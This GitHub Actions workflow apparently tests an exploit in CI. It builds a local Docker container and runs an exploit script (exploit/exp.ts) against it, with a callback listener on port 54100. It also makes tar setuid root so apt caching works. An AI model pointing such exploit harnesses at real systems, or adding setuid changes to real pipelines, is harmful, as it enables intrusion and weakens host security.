name: Exploit

on:
  - push
  - pull_request

jobs:
  exploit:
    name: Exploit
    runs-on: ubuntu-latest

    strategy:
      matrix:
        node-version: [20.x]

    env:
      HOST_IP:
      DOCKER_PORT:

    steps:
    - uses: actions/checkout@v4

    - uses: oven-sh/setup-bun@v2

    - name: Root tar for cache
      run: |
        sudo chown root /usr/bin/tar && sudo chmod u+s /usr/bin/tar

    - name: Cache apt packages
      id: cache-apt
      uses: actions/cache@v4
      env:
        cache-name: cache-apt
      with:
        path: /var/cache/apt
        key: ${{ runner.os }}-apt-${{ env.cache-name }}-${{ hashFiles('.github/install-docker.sh') }}
        restore-keys: |
          ${{ runner.os }}-apt-${{ env.cache-name }}-
          ${{ runner.os }}-apt-
          ${{ runner.os }}-

    - name: Install docker
      if: ${{ steps.cache-apt.outputs.cache-hit != 'true' }}
      run: bash .github/install-docker.sh

    - name: Build docker image
      run: |
        docker compose -f '.github/docker-compose.exploit.yml' build

    - name: Up docker container
      run: |
        docker compose -f '.github/docker-compose.exploit.yml' up -d
        sleep 3
        HOST_IP=$(ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
        echo "Host IP: $HOST_IP"
        echo "HOST_IP=$HOST_IP" >> $GITHUB_ENV
        DOCKER_PORT=$(grep -oP 'EXPOSE \K[0-9]+' Dockerfile | tail -n1)
        [ -z "$DOCKER_PORT" ] && DOCKER_PORT=80
        echo "Container Port: $DOCKER_PORT"
        echo "DOCKER_PORT=$DOCKER_PORT" >> $GITHUB_ENV

    - name: Exploit
      run: |
        bun exploit/exp.ts '${{ env.HOST_IP }}:${{ env.DOCKER_PORT }}' -r '${{ env.HOST_IP }}:54100' -p 54100

